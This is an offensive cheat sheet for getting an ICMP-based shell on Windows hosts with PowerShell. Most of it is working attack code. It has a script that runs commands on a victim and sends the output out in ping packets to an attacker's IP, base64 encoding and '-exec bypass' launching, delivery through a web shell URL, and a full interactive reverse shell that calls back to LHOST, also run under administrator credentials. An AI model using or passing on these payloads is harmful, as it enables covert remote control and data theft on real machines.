ICMP Shell on Windows using Powershell
----------------------

#Run commands on a remote windows host

#Install powershell on linux
#https://github.com/PowerShell/PowerShell).

#Execute commands in powershell
#cmd /c PowerShell.exe -Exec ByPass "Write-Host 'Hello, World!'"

# in powershell (pwsh)
# (if you copy/paste the following lines please remove the newlines and use your ip)
# Where x.x.x.x is your RedTeam(Attacker)

PS /> $string = {$c="cmd /c dir c:\ ";$IP="x.x.x.x";$ic = New-Object
System.Net.NetworkInformation.Ping;$PO = New-Object
System.Net.NetworkInformation.PingOptions;$PO.DontFragment = $True;$r=(IEX -ErrorAction continue
-Command $c | Out-String );$s=([text.encoding]::ASCII).GetBytes($r);if($s.length -gt 1024)
{for($i=0; $i -le 100; $i++){$s2 = $s[($i*1024)..((($i+1)*1024)-1)];$ic.Send($IP,4096, $s2, $PO) |
Out-Null;}}else{$ic.Send($IP,4096,$s,$PO) | Out-Null;}}.ToString()
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
$encodedcommand   


#output:

JABjAD0AIgBjAG0AZAAgAC8AYwAgAGQ  [snipped]

#Now you can send this on the BlueTeam(Victim)
powershell -exec bypass -noprofile -encodedcommand JABjAD0AIgBjAG0AZAAgAC8AYwAgAGQ [snipped]

#If you open up tcpdump on your RedTeam(Attacker) you can now sniff out the return
#Make sure ICMP traffic on your RedTeam(Attacker is allowed)
#sysctl -w net.ipv4.icmp_echo_ignore_all=1

tcpdump -X -nni tun0 icmp:

tcpdump -X -nni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
23:13:13.044610 IP x.x.x.x > x.x.x.x: ICMP echo request, id 1, seq 6, length 655
    0x0000:  4500 02a3 3f1f 4000 7f01 8d75 0a0a 0a39  E...?.@....u...9
    0x0010:  0a0a 0e79 0800 42c0 0001 0006 2056 6f6c  ...y..B......Vol
    0x0020:  756d 6520 696e 2064 7269 7665 2043 2068  ume.in.drive.C.h
    0x0030:  6173 206e 6f20 6c61 6265 6c2e 0d0a 2056  as.no.label....V
    0x0040:  6f6c 756d 6520 5365 7269 616c 204e 756d  olume.Serial.Num
    0x0050:  6265 7220 6973 2031 3433 422d 3138 3034  ber.is.143B-1804
[...]


# pwsh
# Replace type (file location to display) & x.x.x.x with RedTeam (Attacker)
$body = {$IP="x.x.x.x";$ic = New-Object System.Net.NetworkInformation.Ping;$PO = New-Object System.Net.NetworkInformation.PingOptions;$PO.DontFragment = $True;$r=(IEX -ErrorAction continue -Command $c | Out-String );$s=([text.encoding]::ASCII).GetBytes($r);if($s.length -gt 1024){for($i=0; $i -le 100; $i++){$s2 = $s[($i*1024)..((($i+1)*1024)-1)];$ic.Send($IP,4096, $s2, $PO) | Out-Null;}}else{$ic.Send($IP,4096,$s,$PO) | Out-Null;}}.ToString()                                        

$command = {$c="type c:\inetpub\public\test.asp ";}.ToString()
$string = $command + $body
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))                                                                                                      

#outupt
JABjAD0AIgB0AHkAcABlACAAYwA6AFwAaQ  [snipped]


#In a browser if you can write to the host
http://x.x.x.x:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell -exec bypass -noprofile -encodedcommand JABjAD0AIgB0AHkAcABlACAAYwA6AFwAaQBuAGUAdABw AHUAYgBcAHAAdQBiAGwAaQBjAFwAdABlAHMAdAAuAGEAcwBwACAAIgA7ACQ  [snipped]



#Get a ICMP Shell on a remote host using powershell
#If you can ping from your BlueTeam(Victim) to your RedTeam (Attacker)
#Run icmpsh_m.py (RedTeam)
#Or run python2 icmp_alamot.py (RedTeam)
#Payload to run on BlueTeam(Victim)
$ip = 'LHOST'; $id = 'UNIQUEID'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer);  if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); }



#Execute command as user
#Change to reflect credentials 
$user = '.\administrator'; $passwd = '1234test'; $secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpswd; invoke-command -computername localhost -credential $credential -scriptblock { COMMANDS }



#Change Credentials to user
#Change to reflect credentials 
$user = '.\administrator'; $passwd = '1234test'; $secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpswd; invoke-command -computername localhost -credential $credential -scriptblock { $ip = 'LHOST'; $id = 'UNIQUEID'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer);  if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); } }


